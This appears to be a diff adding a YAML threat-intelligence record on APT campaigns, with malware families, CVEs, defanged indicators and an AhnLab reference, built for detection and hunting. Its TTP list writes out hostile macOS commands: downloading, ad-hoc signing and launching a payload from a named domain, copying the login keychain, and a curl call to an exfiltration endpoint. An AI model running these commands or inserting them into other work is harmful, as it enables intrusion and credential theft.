@@ -1,0 +1,58 @@
+description: APT groups including Lotus Blossom, APT28, TA-RedAnt (APT37), UAT-8616,
+  UNC3886, and UNC6201 conducted various attacks using supply chain breaches, zero-day
+  exploits, and advanced air-gap bypass techniques.
+malware_families:
+- Chrysalis
+- Cobalt Strike Beacon
+- Covenant Grunt
+- Ruby runtime droppers
+- GRIMBOLT
+- BRICKSTORM
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - curl -o /Library/Caches/com.apple.sys.receipt http://teams.microscall[.]com/payload
+  - chmod 777 /Library/Caches/com.apple.sys.receipt
+  - codesign --force --deep --sign - /Library/Caches/com.apple.sys.receipt
+  - nohup /Library/Caches/com.apple.sys.receipt &
+  - osascript -e "do shell script \\"/private/tmp/.aLTJwk\\""
+  - /usr/bin/osascript -e "do shell script \\"cp /Users/$USER/Library/Keychains/login.keychain-db
+    /tmp/staged_keychain\\""
+  - /usr/bin/curl http://attacker-controlled-domain.com/exfiltrate
+  powershell: []
+  scripting_engine:
+  - Ruby
+  - AppleScript
+  registry_keys: []
+  image_load:
+  - com .apple.sys.receipt
+  - com .apple.icloud.sync
+  network_connections:
+  - curl -> teams.microscall[.]com
+  - /usr/bin/curl -> attacker-controlled-domain.com
+  file_activity:
+  - /Library/Caches/com.apple.sys.receipt
+  - /private/tmp/.aLTJwk
+  - /tmp/staged_keychain
+  persistence: []
+  process_relations: []
+CVEs:
+- CVE-2026-21509
+- CVE-2026-21513
+- CVE-2026-20127
+- CVE-2022-20775
+- CVE-2026-22769
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - teams.microscall[.]com
+  - attacker-controlled-domain.com
+  urls:
+  - http://teams.microscall[.]com/payload
+  - http://attacker-controlled-domain.com/exfiltrate
+reference: https://asec.ahnlab.com/en/92906
+date_of_publication: March 11, 2026
+file_creation_date: March 14, 2026
